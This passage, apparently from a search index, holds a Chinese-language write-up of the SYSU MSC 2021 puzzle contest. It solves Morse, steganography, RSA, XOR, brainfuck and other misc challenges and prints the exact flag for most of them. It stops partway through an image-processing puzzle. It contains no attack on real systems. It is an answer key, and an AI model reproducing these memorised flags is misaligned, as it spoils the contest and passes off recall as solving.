writeup\uff1a</p>"}, {"location": "writeups/sysu_msc_puzzle/#_1", "title": "\u4f60\u597d\uff01\u52c7\u58eb", "text": "<p>\u5ba3\u4f20\u6d77\u62a5\u548c\u9996\u9875\u90fd\u6709\uff0cflag\uff1a<code>msc{He1lo_Wor1d}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_2", "title": "\u8001\u53e4\u8463", "text": "<p><code>-.-. --- -.. . --- ..-. - .... . .---- ----. - .... -.-. . -. - ..- .-. -.--</code></p> <p>\u6469\u5c14\u65af\u7535\u7801\uff0c\u6839\u636e\u9996\u9875\u7684\u8bf4\u660e\u5728\u5355\u8bcd\u95f4\u52a0\u4e0a\u4e0b\u5212\u7ebf\u5f97\u5230 flag\uff1a<code>msc{CODE_OF_THE_19TH_CENTURY}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_3", "title": "\u8eb2\u5728\u5899\u540e", "text": "<p>\u6253\u5f00 DevTools \u770b Console\uff0cflag\uff1a<code>msc{Wow_Y0u_f1nd_me}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_4", "title": "\u9690\u8eab\u836f\u6c34", "text": "<p>\u6253\u5f00 DevTools \u770b\u4ee3\u7801\uff0c\u6709\u4e00\u4e2a display: none \u7684 flag\uff1a<code>msc{Inv1sibility_P0tiOn}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_5", "title": "\u5b8c\u5f62\u586b\u7a7a", "text": "<p>We, the rustling leaves,  have a voice that answers the storms, but who are you so silent?  I am _____.</p> <p>\u641c\u7d22\u8fd9\u6bb5\u8bd7\u6b4c\u5f97\u5230\u7a7a\u7f3a\u5185\u5bb9\uff0c\u683c\u5f0f\u5316\u4e00\u4e0b\u5f97\u5230 flag\uff1a<code>msc{a_mere_flower}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_6", "title": "\u53bb\u95ee\u5bfc\u822a", "text": "<p>\u53bb\u627e\u90a3\u4e2a\u5730\u65b9\u5427\uff01\ud83d\udc7b.\ud83d\udc7e.sysums.club</p> <p>\u5e76\u4e14\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u4e2a display: none \u7684 TXT \u5b57\u6837</p> <p>\u94fe\u63a5\u76f4\u63a5\u8f6c\u5230\u7684\u5730\u5740\u662f <code>http://xn--9q8h.xn--dr8h.sysums.club/</code></p> <p>\u6240\u4ee5\u7528 dig \u547d\u4ee4\u67e5\u8be2\u4e00\u4e0b\u8fd9\u4e2a\u57df\u540d\u7684 TXT \u8bb0\u5f55\u5c31\u53ef\u4ee5\u4e86 <pre><code>dig xn--9q8h.xn--dr8h.sysums.club txt\n</code></pre> flag\uff1a<code>msc{Domain_w1th_IDNs}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_7", "title": "\u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848", "text": "<p>The answer to the ultimate question of life, the universe, and everything equals to A^3 + B^3 + C^3 \u52c7\u58eb\uff0c\u8fd9\u9053\u9898\u7684\u7b54\u6848\u662f msc{A+B+C}</p> <p>\u4e16\u95f4\u4e07\u7269\u7684\u7b54\u6848\u5373\u6307 42\uff0c\u7136\u540e\u641c\u7d22\u5f97\u5230 </p> \\[ -80538738812075974^3 + 80435758145817515^3+ 12602123297335631^3 = 42 \\] <p>\u6240\u4ee5 flag\uff1a<code>msc{12499142631077172}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_8", "title": "\u6211\u7684\u5496\u5561", "text": "<p>\u6211\u4eec\u7684\u9152\u9986\u91c7\u7528\u6700\u65b0\u7684 HTCPCP/1.0 \u534f\u8bae\u4e3a\u60a8\u63d0\u4f9b\u670d\u52a1\uff01 \u201c\u563f\uff0c\u9152\u4fdd\uff01\u6211\u7684\u5496\u5561\u5462\uff1f\u201d \u201c\u5728\u505a\u4e86\uff01\u201d \u8be5\u6b7b\uff0c\u6211\u5fd8\u4e86\u8ba9\u4ed6\u5c11\u52a0\u70b9\u725b\u5976\uff0c\u6211\u5f97\u7acb\u523b\u8ba9\u4ed6\u505c\u4e0b\uff01</p> <p>\u641c\u7d22 HTCPCP/1.0 \uff08\u8d85\u6587\u672c\u5496\u5561\u58f6\uff09\u534f\u8bae\uff0c\u505c\u6b62\u52a0\u5165\u725b\u5976\u7684\u8bf7\u6c42\u662f WHEN\uff0c\u6240\u4ee5 flag\uff1a<code>msc{WHEN}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_9", "title": "\u8bbe\u8ba1\u5e08", "text": "<p>\u300c\u6211\u60f3\u8981\u8fd9\u4e2a\u5b57\u5c0f\u4e00\u70b9\u7684\u540c\u65f6\u5927\u4e00\u70b9\u300d</p> <p>ww91igfYzsb0AguGyMvZDcbKzxnPz25LCIekBxnJE1qWxZrUB3rOzxjFqMfZzty0Fq==</p> <p>\u5927\u5199\u8f6c\u5c0f\u5199\uff0c\u5c0f\u5199\u8f6c\u5927\u5199\uff0c\u7136\u540e base64 \u89e3\u7801\uff0c\u5f97\u5230 flag\uff1a<code>msc{T0_4nother_Base64}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_10", "title": "\u76d1\u542c\u7535\u8bdd", "text": "<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/phone.mp3</p> <p>\u662f\u4e00\u4e32\u7535\u8bdd\u7684\u62e8\u53f7\u97f3\uff0c\u653e\u5230 Au \u91cc\u9762\u770b\u9891\u8c31\uff0c\u628a\u5bf9\u5e94\u6309\u952e\u6284\u4e0b\u6765\u5c31\u884c\u4e86\uff0c\u5177\u4f53\u662f\u4ec0\u4e48\u8bb0\u4e0d\u5f97\u4e86</p>"}, {"location": "writeups/sysu_msc_puzzle/#_11", "title": "\u4e00\u5f20\u56fe\u7247", "text": "<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.png</p> <p>stegsolve \u6253\u5f00\uff0c\u5728 red 0 \u53ef\u4ee5\u6e05\u6670\u770b\u5230 flag\uff1a<code>msc{Text_Hidd3n_Und6r_The_1mage}</code> </p>"}, {"location": "writeups/sysu_msc_puzzle/#_12", "title": "\u6570\u5b57\u5e8f\u5217", "text": "<p>..., 22, 30, 42, 56, ? , 101, 135, 176, 231, 297, ... ..., 72, 81, 90, 100, 110, ?, 132, 144, 156, 169, ... ..., 43, 47, 55, 67, 79, ?, 123, 155, 171, 175, ... ..., 891, 9805, 25, 527, 23, ?, 17, 37, 131, 43, ... ..., 58, 51, 89, 28, 97, ?, 30, 103, 107, 62, ... ..., 20, 26, 36, 50, 60, ?, 135, 138, 248, 315, ... ..., 2, 1, 9, 35, 77, ?, 91, 49, 15, 2, ... ..., 49, 62, 70, 77, 91, ?, 103, 107, 115, 122, ... ..., 8, 26, 60, ?, 196, 308, 456, 645, 880, 1166, ...</p> <p>\u76f4\u63a5\u5206\u522b\u7c98\u8d34\u5230 OEIS \u4e2d\uff0c\u5f97\u5230\u9700\u8981\u586b\u7684\u6570\u5b57\uff1a</p> <p><code>77 121 95 83 101 114 105 101 115</code></p> <p>\u770b\u6570\u5b57\u8303\u56f4\u633a\u89c4\u6574\uff0cASCII \u8f6c\u6362\u4e00\u4e0b\u5f97\u5230 flag\uff1a<code>msc{My_Series}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_13", "title": "\u672a\u77e5\u4fe1\u53f7", "text": "<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/signal.mp3 \u6211\u89c9\u5f97\uff0c\u8fd9\u91cc\u9762\u6709\u8e4a\u8df7\uff01\u4f60\u77e5\u9053\u4e8c\u5341\u4e16\u7eaa\u4e94\u516d\u5341\u5e74\u4ee3\u7684\u7535\u89c6\u662f\u4f7f\u7528\u6444\u50cf\u7ba1\u548c\u7535\u5b50\u76d1\u89c6\u5668\u5236\u6210\u7684\u5417\uff1f</p> <p>\u6240\u4ee5\u5e94\u8be5\u662f SSTV\uff08\u6162\u626b\u63cf\u7535\u89c6\uff09\u4f20\u8f93\u56fe\u7247\uff0c\u7528\u624b\u673a\u8f6f\u4ef6 Robot36 \u5c31\u53ef\u4ee5\u8f6c\u6362\uff0c\u5f97\u5230\uff1a </p> <p>\u626b\u63cf\u5f97\u5230 flag\uff1a<code>msc{SSTV_transfer_image}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_14", "title": "\u53c8\u4e00\u5f20\u56fe\u7247", "text": "<p>https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc2.png</p> <p>\u8fd8\u662f\u6254\u5230 stegsolve \u91cc\uff0c\u5728 red0 green0 blue0 \u5206\u522b\u80fd\u770b\u5230\u6587\u5b57\uff0c\u5408\u8d77\u6765\u662f <code>\u5bc6\u7801\u662f p455w0rd</code> </p> <p>binwalk \u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a png \u91cc\u504f\u79fb <code>0xC23A</code> \u540e\u9762\u85cf\u4e86\u4e00\u4e2a zip\uff0c\u63d0\u53d6\u51fa\u6765\u7528\u5bc6\u7801\u89e3\u538b\u5f97\u5230\u4e00\u4e2a svg \u6587\u4ef6</p> <p>\u6d4f\u89c8\u5668\u6253\u5f00\u4e4b\u540e\u53d1\u73b0\u6709\u4e00\u4e2a\u767d\u8272\u77e9\u5f62\uff0c\u5220\u6389\u5b83\u5c31\u80fd\u770b\u5230 flag\uff1a<code>msc{svg_The_vectors}</code></p> <p></p>"}, {"location": "writeups/sysu_msc_puzzle/#_15", "title": "\u76f2\u4eba\u6570\u5b66\u5bb6", "text": "<p>\u2838\u2829\u282e\u2830\u2824\u2806\u2818\u2806\u2810\u2837\u282d\u2818\u2812\u2810\u2809\u2815\u280e\u2839\u282d\u280c\u2806\u283c\u282c\u2839\u2802\u280c\u2806\u283c\u283e\u281c\u2832\u2824\u282d\u2818\u2806\u2810\u283b\u2819\u282d\u2838\u2831</p> <p>Tip: \u5c06\u7ed3\u679c\u56db\u820d\u4e94\u5165\u4fdd\u7559 7 \u4f4d\u5c0f\u6570\uff0c\u5e76\u7528_\u66ff\u6362\u5c0f\u6570\u70b9\u540e\u63d0\u4ea4</p> <p>\u5bf9\u7167\u6559\u7a0b https://nemeth.aphtech.org/ \u5b66\u4e60\uff0c\u8f6c\u6362\u516c\u5f0f\uff1a</p> <p> </p> \\[ \\int_{-2}^2(x^3\\cos\\frac{x}{2}+\\frac{1}{2})\\sqrt{4-x^2}\\mathrm dx = \\pi \\approx 3.1415927 \\] <p>\u6240\u4ee5 flag\uff1a<code>msc{3_1415927}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_16", "title": "\u6700\u5c0f\u7684\u8bed\u8a00", "text": "<p>\u52c7\u58eb\uff0c\u636e\u8bf4\u8fd9\u4e2a\u4e16\u754c\u5728\u5f88\u4e45\u8fdc\u7684\u65f6\u5019\u6709\u4e00\u4f4d\u51ef\u6492\u5927\u5e1d\uff0c\u5728\u4ed6\u79bb\u4e16\u7684\u65f6\u5019\uff0c\u4e3a\u8fd9\u4e2a\u4e16\u754c\u521b\u9020\u4e86\u4e00\u79cd\u6700\u5c0f\u7684\u8bed\u8a00\uff0c\u6211\u4eec\u90fd\u4e0d\u6562\u8bfb\u51fa\u5b83\u7684\u540d\u79f0\u2026\u2026 <pre><code>+++++++[-&gt;+++++++&lt;]&gt;++++++++++++.&lt;+++++[-&gt;+++++&lt;]&gt;+.++.&lt;+++++[-&gt;+++++&lt;]&gt;++++++.+.&lt;+++++[-&gt;-----&lt;]&gt;--.-------.+.&lt;++++[-&gt;----&lt;]&gt;-------.&lt;+++++++[-&gt;+++++++&lt;]&gt;.----.&lt;++++++++[-&gt;--------&lt;]&gt;------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++.++.+++++++++.&lt;+++[-&gt;---&lt;]&gt;---.&lt;++++++++[-&gt;--------&lt;]&gt;---------------.&lt;+++[-&gt;+++&lt;]&gt;+++.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++++.&lt;++++++[-&gt;------&lt;]&gt;-----------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++.&lt;++++++++[-&gt;--------&lt;]&gt;--.&lt;+++++[-&gt;+++++&lt;]&gt;+++.&lt;++++++[-&gt;------&lt;]&gt;.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++.&lt;++++++[-&gt;------&lt;]&gt;----------.++++++.&lt;+++++[-&gt;+++++&lt;]&gt;+.&lt;+++++++[-&gt;-------&lt;]&gt;---------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++++++.&lt;+++++++[-&gt;-------&lt;]&gt;----.--.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++.-----.&lt;++++++++[-&gt;--------&lt;]&gt;-.&lt;++++++[-&gt;++++++&lt;]&gt;+.&lt;+++++[-&gt;+++++&lt;]&gt;.+++.++++++.&lt;+++++++[-&gt;-------&lt;]&gt;----------.---..&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++++.&lt;+++[-&gt;---&lt;]&gt;-.------.&lt;+++[-&gt;+++&lt;]&gt;+++.&lt;++++++++[-&gt;--------&lt;]&gt;------------.&lt;+++[-&gt;+++&lt;]&gt;+++.+.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++.++++.++++++.&lt;+++++[-&gt;-----&lt;]&gt;----------.&lt;+++++[-&gt;-----&lt;]&gt;---------.-----.++++++.&lt;++++[-&gt;----&lt;]&gt;.&lt;++++[-&gt;++++&lt;]&gt;++++++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++++.&lt;++++++++[-&gt;--------&lt;]&gt;---..&lt;++++[-&gt;----&lt;]&gt;.&lt;+++++[-&gt;+++++&lt;]&gt;+.&lt;++++[-&gt;++++&lt;]&gt;+++++.&lt;+++++[-&gt;-----&lt;]&gt;.-------.-------.--------.&lt;++++[-&gt;++++&lt;]&gt;+++++.-----..&lt;++++[-&gt;----&lt;]&gt;.&lt;++++[-&gt;++++&lt;]&gt;++++.&lt;+++[-&gt;---&lt;]&gt;-.++++.+++.&lt;+++++[-&gt;+++++&lt;]&gt;++++++.&lt;++++[-&gt;----&lt;]&gt;------.++++.&lt;++++[-&gt;++++&lt;]&gt;+++++++.&lt;++++++[-&gt;------&lt;]&gt;-----------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++.&lt;+++++++[-&gt;-------&lt;]&gt;-------.----.------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++++++++++.&lt;++++++++[-&gt;--------&lt;]&gt;--------..&lt;++++++[-&gt;++++++&lt;]&gt;+++++.&lt;+++++[-&gt;+++++&lt;]&gt;++++.--.&lt;+++++[-&gt;-----&lt;]&gt;--------.&lt;+++++[-&gt;-----&lt;]&gt;---.---------.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++.+++++++++.&lt;++++++++[-&gt;--------&lt;]&gt;----------------.&lt;++++++++[-&gt;++++++++&lt;]&gt;+++++.+++.&lt;++++++++[-&gt;--------&lt;]&gt;-------.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++++.&lt;+++++++[-&gt;-------&lt;]&gt;--------.&lt;+++[-&gt;---&lt;]&gt;---.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++.&lt;+++[-&gt;+++&lt;]&gt;+++.&lt;++++++++[-&gt;--------&lt;]&gt;.++++++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++++++++++++.&lt;+++++[-&gt;-----&lt;]&gt;-.&lt;+++++++[-&gt;-------&lt;]&gt;----.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++++++++++++.+.&lt;++++[-&gt;----&lt;]&gt;-----.&lt;+++++++[-&gt;-------&lt;]&gt;--.&lt;+++++++[-&gt;+++++++&lt;]&gt;+.&lt;+++++[-&gt;-----&lt;]&gt;-------.-----.-.&lt;+++++++[-&gt;+++++++&lt;]&gt;+.&lt;+++++++[-&gt;-------&lt;]&gt;------.&lt;++++++++[-&gt;++++++++&lt;]&gt;++++..&lt;+++[-&gt;---&lt;]&gt;---.&lt;+++[-&gt;+++&lt;]&gt;++++.&lt;++++++++[-&gt;--------&lt;]&gt;------------.-------.&lt;+++++++[-&gt;+++++++&lt;]&gt;++++++.++.&lt;+++++[-&gt;+++++&lt;]&gt;+++++++++.----.-------.&lt;+++[-&gt;+++&lt;]&gt;++.&lt;+++[-&gt;---&lt;]&gt;----.++++++..+.&lt;++++++++[-&gt;--------&lt;]&gt;-----------.&lt;++++[-&gt;++++&lt;]&gt;+++++.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++++++.&lt;+++++++++[-&gt;---------&lt;]&gt;----------.&lt;+++++[-&gt;+++++&lt;]&gt;+++.&lt;+++++++[-&gt;+++++++&lt;]&gt;+++++++.&lt;\n</code></pre></p> <p>brainfuck \u8f93\u51fa\u5f97\u5230\uff1a<code>=WYxy^WXArn(qs|p!-k&lt;~&lt;X4i;A[!n97zu4Yru{@=={qkw+78tx~[94:*By66&amp;@U&lt;5.&amp;;66&amp;:047V@D[,r:60}55^{yX&lt;3@u~.sv/m4(]i)1pV!op[(Z:54f/ssgt(!XZ|xq|ouuv+@|!=u</code></p> <p>\u6839\u636e\u9898\u9762\u7684\u51ef\u6492\uff0c\u53ef\u4ee5\u63a8\u6d4b\u662f ASCII \u504f\u79fb\uff0c\u7136\u540e\u628a\u8f93\u51fa\u9650\u5236\u5728 [33, 126] \u4e2d\uff08ASCII\u53ef\u89c1\u5b57\u7b26\uff09\uff0c\u7b2c 54 \u6b21\u504f\u79fb\u7684\u7ed3\u679c\uff1a<code>v24ST923zMIaLNWKZfFuYu3mDtz6ZIrpUPm4MPVyvvVLFRdpqOSY6rmsc{Too_y0ung_too_simp1y}6eMsoiXnn9VT3ulyPYgNQhHma8DbjK1ZJK6a5snmAhNNBOaZ35WSLWJPPQdyWZvP</code></p> <p>\u4e2d\u95f4\u5c31\u662f flag\uff1a<code>msc{Too_y0ung_too_simp1y}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_17", "title": "\u4e00\u4e2a\u4f20\u8bf4", "text": "<p>\u201c\u52c7\u58eb\uff0c\u6211\u542c\u8fc7\u4e00\u4e2a\u53e4\u8001\u7684\u4f20\u8bf4\u2026\u2026\u201d \u201c\u8bf7\u8bb2\uff01\u201d \u300c1024\u00d7768 \u5927\u5c0f\u7684\u56fe\u7247\uff0c\u53ef\u4ee5\u8f7b\u677e\u85cf\u4e0b 786432 \u4e2a\u5730\u5740\u3002\u300d https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/justcolor.png</p> <p>\u4e00\u4e2a\u7eaf\u8272\u6587\u4ef6\uff0c\u6839\u636e\u9898\u9762\u53ef\u4ee5\u63a8\u6d4b\u662f\u8bfb\u53d6 rgba \u503c\u4f5c\u4e3a ip \u5730\u5740</p> <p>\u6240\u4ee5\u5199\u4e2a\u811a\u672c\u8bfb\u4e00\u4e0b <code>from PIL import Image;print(Image.open(\"justcolor.png\").getpixel((0, 0)))</code>\uff0c\u5f97\u5230 ip \u5730\u5740\uff1a116.63.166.50</p> <p>\u8bbf\u95ee\u5f97\u5230 flag\uff1a<code>msc{Hide_IP_in_RGBA}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_18", "title": "\u65f6\u95f4\u5546\u4eba", "text": "<p>\u4f60\u53d1\u73b0\u4e86\u4e00\u5757\u5e03\u6ee1\u82d4\u85d3\u7684\u77f3\u677f\uff0c\u4e0a\u9762\u523b\u7740\u4e0b\u9762\u7684\u51e0\u4e2a\u5b57\uff1a \u2003\u22a7\u00e3\u22b7\u00ac\u00a7\u00d7\u00e3\u02c6\ud835\udd0e \u4f60\u770b\u4e0d\u61c2\uff0c\u4f46\u5927\u53d7\u9707\u64bc\u3002 \u8def\u8fb9\u6709\u4e2a\u795e\u79d8\u7684\u9ed1\u8863\u5546\u4eba\uff0c\u4ed6\u81ea\u79f0\u80fd\u4e3a\u4f60\u63d0\u4f9b\u5e2e\u52a9\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u82db\u523b\u7684\u6761\u4ef6\uff1a\u4f60\u5fc5\u987b\u5728\u6bcf\u5929\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\u8fc7\u6765\u627e\u4ed6\uff0c\u4ed6\u624d\u80fd\u7ed9\u4f60\u63d0\u4f9b\u7ebf\u7d22\u3002</p> <p>\u8c03\u6574\u65f6\u95f4\u5230\u51cc\u6668\u56db\u70b9\u7684\u7b2c\u4e00\u4e2a\u516b\u5206\u949f\u5185\uff0c\u5f97\u5230 hint\uff1a<code>\u5546\u4eba\u770b\u7740\u4f60\uff0c\u4ec0\u4e48\u8bdd\u4e5f\u6ca1\u8bf4\uff0c\u7ed9\u4f60\u9012\u4e86\u4e00\u5f20\u7eb8\u6761\uff0c\u4e0a\u9762\u5199\u7740\uff1acharref\u3002</code></p> <p>\u641c\u7d22\u5f97\u5230\u5b57\u7b26\u5bf9\u7167\u8868\uff1ahttps://dev.w3.org/html5/html-author/charref</p> <p>\u7136\u540e\u4f9d\u6b21\u641c\u7d22\u8fd9\u4e9b\u5b57\u7b26\uff0c\u9996\u5b57\u6bcd\u62fc\u8d77\u6765\u5c31\u662f flag\uff1a<code>msc{mainstacK}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_19", "title": "\u8ffd\u8e2a\u76ee\u6807", "text": "<p>\u4e00\u5f20\u901a\u7f09\u4ee4\u8d34\u5728\u6751\u53e3\u7684\u516c\u544a\u724c\u4e0a\uff0c\u636e\u8bf4\u6355\u83b7\u5230\u4e86\u76d7\u8d3c\u4e0b\u4e00\u6b21\u8981\u4f5c\u6848\u7684\u5730\u65b9\uff0c\u4f46\u6ca1\u4eba\u770b\u5f97\u61c2\u3002 7PMM399R+FQ2 \u201c\u54e6\uff0c\u4f60\u53ea\u9700\u8981\u7528**********\u5c31\u80fd\u5f97\u5230\u7b54\u6848\u201d \u201c\u54e6\uff01\u6536\u5230\uff01\u201d \u201c\u4f60\u77e5\u9053 The simplest way to talk about location \u5417\uff1f\u201d \u201c\u77e5\u9053\u2026\u2026\u539f\u6765\u4f60\u5c31\u662f\u60f3\u8981\u90a3\u4e09\u4e2a\u5355\u8bcd\u554a\u201d</p> <p>\u76f4\u63a5\u4f7f\u7528\u4e09\u8bcd\u5730\u5740\u8c03\u6210\u82f1\u6587\u641c\u7d22 <code>7PMM399R+FQ2</code> \u5f97\u5230\u4f4d\u7f6e\u7684\u4e09\u4e2a\u5355\u8bcd <code>///flux.tank.pitch</code></p> <p>\u6240\u4ee5 flag\uff1a<code>msc{flux_tank_pitch}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_20", "title": "\u7d27\u6025\u5524\u9192", "text": "\u95ee\u9898 <pre><code>from Crypto.Util.number import*\n\np = 0xbb1a21ab46e16672a6dfe537c5d03121252685a1a72fab827ed14d61caa80f68b9bda9fb0d9651719ab099d05fd0da03443a50106533f1034a81e280cd3e85fd\nq = 0x85eed89c104292b715a45ec8a1c3328506b429c2b7477c9ab094313fcf0020ba7352b102608cab79bde92978aedb052a546fb289c453feac87ee791ba1019579\n\nn = p * q\ne = 0x10001\n\nanswer = b'something you dont know'\nm = bytes_to_long(answer)\n\nc = pow(m,e,n)\n# c = 0x17c7af1ec9c020eb9d8f26049f002b58f93591a817ebff4c00e9e46254261db54a2c2d086dd0f532994329faf2133b1c7002913b187f898d87c8093b2290440e927 78956c60b92f27e3dc4d15b4c79f97b79bca253b0b4542375c37f8e37e1f8e38d728634133376eacd2c448aa523b2eda0b4c5f2af47250147f4193d58596c\n</code></pre> <p>\u57fa\u7840\u7684 RSA\uff0c\u8ba1\u7b97\u51fa d \u7136\u540e\u89e3\u5bc6\u5c31\u53ef\u4ee5\u5f97\u5230 flag\uff1a <pre><code>d = pow(e, -1, (p-1) * (q-1))\nprint(long_to_bytes(pow(c, d, n)))\n# b'msc{W0w_You_know_H0w_to_d3crypt_the_RSA}'\n</code></pre></p>"}, {"location": "writeups/sysu_msc_puzzle/#emojis", "title": "Emojis", "text": "<p>\u201c\u8fd9\u662f\u4e00\u4e32 <code>EMOJI</code>\uff0c\u91cc\u9762\u4f1a\u85cf\u7740\u4ec0\u4e48\u6837\u7684\u4fe1\u606f\u5462\uff1f\u201d \ud83d\ude43\ud83d\udcb5\ud83c\udf3f\ud83c\udfa4\ud83d\udeaa\ud83c\udf0f\ud83d\udc0e\ud83e\udd4b\ud83d\udeab\ud83d\ude06\u2705\ud83d\ude0a\ud83d\udc49\ud83d\udc63\ud83d\udcc2\u23e9\ud83d\ude06\ud83c\udf3f\ud83c\udf2a\ud83d\ude0e\ud83c\udf75\u2603\ud83d\udcc2\ud83d\udeb9\ud83d\udc4c\ud83c\udff9\ud83d\udc0e\ud83c\udf3f\ud83d\ude00\ud83d\udc63\ud83c\udfce\ud83d\ude0d\ud83d\ude06\ud83c\udf74\u2705\ud83d\udc41\u2705\u2705\ud83d\ude06\ud83d\udd79\ud83d\udd2c\ud83d\udc0d\ud83c\udf85\u2716\ud83c\udf2a\ud83d\udc63\ud83d\udeb9\ud83d\udca7\ud83c\udf74\ud83d\udcb5\ud83c\udf4d\ud83c\udf2a\u2709\ud83d\udc41\ud83d\udeaa\ud83d\udd2a\u23e9\ud83d\udca7\ud83c\udf83\ud83e\udd4b\ud83d\udd79\ud83c\udf4e\ud83d\ude0a\u2139</p> <p>\u54e6\u5bf9\u4e86\uff0c\u6211\u8981\u7684\u662f\u5ffd\u7565\u8bef\u5dee\u540e\u7684\u6570\u5b57\u54e6~</p> <p>DevTools \u91cc\u53ef\u4ee5\u770b\u5230 display: none \u7684 aes\uff1f\u6240\u4ee5\u5e94\u8be5\u662f\u4f7f\u7528 emoji-aes</p> <p>\u6839\u636e\u9898\u9762\u4e2d\u7684\u5168\u5927\u5199\u3001\u4ee3\u7801\u5757\u5305\u88f9\u7684 <code>EMOJI</code>\uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa key \u5c31\u662f EMOJI\uff0c\u89e3\u5bc6\u5f97\u5230\uff1a <pre><code>ORANGE\nRED\nYELLOW\nGREEN\nGOLD\n</code></pre></p> <p>\u6839\u636e\u989c\u8272\u4ee5\u53ca\u9898\u9762\u4e2d\u7684\u201c\u5ffd\u7565\u8bef\u5dee\u201d\u731c\u6d4b\u662f\u4e94\u8272\u73af\u7535\u963b\uff0c\u8f6c\u6362\u5f97\u5230\u5ffd\u7565\u8bef\u5dee\u540e\u662f 32400000 \u6b27\u59c6\uff0c\u6240\u4ee5 flag\uff1a<code>msc{32400000}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_21", "title": "\u7b80\u6613\u52a0\u5bc6", "text": "<p>\u636e\u8bf4\u8fd9\u662f\u4e00\u79cd\u6781\u5176\u666e\u904d\u7684\u52a0\u5bc6\u65b9\u6cd5\u2026\u2026 \u800c\u4e14\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u2026\u2026 \u6216\u8bb8\u2026\u2026\u4f60\u53ef\u4ee5\u542c\u5230\u6765\u81ea\u7b54\u6848\u7684\u58f0\u97f3\u2026\u2026 https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/msc.enc</p> <p>\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u89e3\u5bc6\u7684\u7b80\u6613\u52a0\u5bc6\uff0c\u53ef\u4ee5\u731c\u6d4b\u662f\u5f02\u6216\uff0c\u7136\u540e\u6253\u5f00\u770b\u5341\u516d\u8fdb\u5236\u53d1\u73b0\u5f88\u591a <code>0x66</code>\uff0c\u6240\u4ee5\u8003\u8651\u5168\u90e8\u5f02\u6216 <code>0x66</code>\uff1a <pre><code>import struct\nres = []\nwith open(\"msc.enc\", \"rb\") as f:\n    while True:\n        c = f.read(1)\n        if not c:\n            break\n        res.append(ord(c) ^ 0x66)\n\nwith open(\"res.bin\", \"wb\") as f:\n    for each in res:\n        f.write(struct.pack(\"B\", each))\n</code></pre> \u5f97\u5230\u7684 res.bin \u4e2d\u53ef\u4ee5\u5f88\u5bb9\u6613\u53d1\u73b0 <code>FL Keys</code> \u548c\u4e00\u4e9b\u952e\u540d\uff0c\u7528 fl \u6216\u8005\u5e93\u4e50\u961f\u7b49\u8f6f\u4ef6\u6253\u5f00\u5c31\u53ef\u4ee5\u770b\u5230 flag\uff1a<code>msc{The_xor_midi_GIFT}</code></p>"}, {"location": "writeups/sysu_msc_puzzle/#_22", "title": "\u56fe\u50cf\u5904\u7406\u5927\u5e08", "text": "<p>\u4f60\u5c31\u662f\u56fe\u50cf\u5904\u7406\u5927\u5e08\uff01 \u6240\u4ee5\u5e2e\u6211\u627e\u5230\u85cf\u5728\u56fe\u7247\u91cc\u7684\u79d8\u5bc6\u5427\uff01\u54e6\u5bf9\u4e86\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u5f20\u5c0f\u7eb8\u6761\uff0c\u5e94\u8be5\u80fd\u5e2e\u5230\u4f60\uff08 <code>0.8560967955058971 17.682512473330895</code> https://mscpuzzle.oss-cn-guangzhou.aliyuncs.com/2021/cv.zip</p> \u9898\u76ee\u4ee3\u7801 <pre><code>import cv2\nimport numpy as np\n\ndef mapping(data, down=0, up=255, tp=np.uint8):\n    data_max = data.max()\n    data_min = data.min()\n    interval = data_max - data_min\n    new_interval = up - down\n    new_data = (data - data_min) * new_interval / interval + down\n    new_data = new_data.astype(tp)\n    return new_data\n\ndef fft(img):\n    fft = np.fft.fft2(img)\n    fft = np.fft.fftshift(fft)\n    m = np.log(np.abs(fft))\n    p = np.angle(fft)\n    return m, p\n\nif __name__ == '__main__':\n    img = cv2.imread(f'answer.png', cv2.IMREAD_GRAYSCALE)\n\n    